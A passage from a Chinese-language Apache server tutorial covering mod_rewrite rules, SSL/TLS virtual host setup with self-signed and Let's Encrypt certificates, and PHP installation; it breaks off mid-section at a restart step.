<h3 id="1-url重写模块mod_rewrite">1. URL重写模块（mod_rewrite）<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-url重写模块mod_rewrite" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rewrite</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 验证模块加载</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">apache2ctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -M</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rewrite</span></span></code></pre></figure>
<p><strong>常用重写规则示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Indexes FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在.htaccess或虚拟主机配置中</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_rewrite.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> On</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteBase</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 强制HTTPS</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTPS}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://%{HTTP_HOST}/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 强制www</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_HOST}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !^www\.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://www.%{HTTP_HOST}/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 去除www</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{HTTP_HOST}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ^www\.(.+)$</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [NC]</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://%1/$1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # URL美化（移除.php扩展名）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REQUEST_FILENAME}</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> !-d</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteCond</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> %{REQUEST_FILENAME}.php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> -f</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^(.*)$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> $1.php</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 阻止访问隐藏文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> &quot;^\.(.*)$&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;-&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [F]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 重定向旧URL到新URL</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    RewriteRule</span><span style="--shiki-light:#032F62;--shiki-dark:#DBEDFF;"> ^old-page\.html$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /new-page.html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> [R=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">301</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">,L]</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="2-ssltls配置">2. SSL/TLS配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-ssltls配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用SSL模块</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ssl</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2enmod</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> socache_shmcb</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建自签名证书（测试用）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mkdir</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> req</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -x509</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -nodes</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -days</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 365</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -newkey</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> rsa:2048</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    -keyout</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/apache-selfsigned.key</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    -out</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/apache-selfsigned.crt</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> \</span></span>
<span data-line><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">    -subj</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;/C=US/ST=State/L=City/O=Organization/CN=localhost&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 生成强DH参数（可选，增强安全性）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dhparam</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -out</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/ssl/dhparam.pem</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 2048</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置SSL虚拟主机</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/default-ssl.conf</span></span></code></pre></figure>
<p><strong>完整SSL虚拟主机配置：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_ssl.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> *:443</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ServerName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> localhost</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ServerAdmin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> admin@localhost</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        DocumentRoot</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /var/www/html</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSL引擎</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLEngine</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> on</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 证书文件</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCertificateFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/apache2/ssl/apache-selfsigned.crt</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCertificateKeyFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/apache2/ssl/apache-selfsigned.key</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 可选：DH参数</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSLOpenSSLConfCmd DHParameters /etc/apache2/ssl/dhparam.pem</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # SSL协议和加密套件（推荐配置）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLProtocol</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all -SSLv2 -SSLv3 -TLSv1 -TLSv1.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLCipherSuite</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> HIGH:!aNULL:!MD5:!3DES</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        SSLHonorCipherOrder</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> on</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # HSTS头（启用后）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Strict-Transport-Security &quot;max-age=</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">31536000</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; includeSubDomains; preload&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 目录配置</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes +FollowSymLinks</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            AllowOverride</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> All</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 日志</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        ErrorLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/ssl-error.log</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        CustomLog</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ${APACHE_LOG_DIR}/ssl-access.log combined</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        LogLevel</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> warn</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">VirtualHost</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<p><strong>启用SSL站点：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用SSL站点</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> a2ensite</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> default-ssl.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试HTTPS访问</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> https://localhost</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看证书信息</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">openssl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> s_client</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -connect</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> localhost:443</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -showcerts</span></span></code></pre></figure>
<p><strong>使用Let’s Encrypt免费证书（生产环境）：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装Certbot</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> python3-certbot-apache</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 自动配置SSL</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --apache</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> yourdomain.com</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> www.yourdomain.com</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 仅获取证书不自动配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certonly</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --apache</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> yourdomain.com</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 测试自动续期</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> renew</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --dry-run</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看已安装证书</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certbot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> certificates</span></span></code></pre></figure>
<h3 id="3-php支持">3. PHP支持<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-php支持" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 安装PHP及常用扩展</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apt</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> install</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> libapache2-mod-php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-mysql</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-gd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-curl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-xml</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> php-mbstring</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -y</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置PHP作为默认索引</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/mods-enabled/dir.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改DirectoryIndex，将index.php放在前面</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">DirectoryIndex</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.php</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.html</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.cgi</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.pl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.xhtml</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> index.htm</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启Apache</span></span>
